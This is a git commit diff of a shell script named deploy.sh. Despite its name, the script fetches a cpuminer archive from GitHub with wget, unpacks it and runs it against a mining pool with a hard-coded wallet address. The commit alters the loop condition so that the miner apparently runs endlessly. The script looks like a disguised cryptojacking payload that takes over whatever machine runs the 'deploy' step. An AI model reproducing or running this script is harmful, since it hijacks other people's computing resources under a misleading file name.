760d7fb593391371239d8fd24b39045ca62484e4
terrance263 <85377355+terrance263@users.noreply.github.com>
2021-06-05 08:44:05 +0700

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
  
 COUNTER=20
-until [  $COUNTER -lt 10 ]; do
+until [  $COUNTER -lt 20 ]; do
 
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RJFhRvKsHs6GMx5DdsNDopRVZitbiPoTwX.AWs01 -p x -t6
 
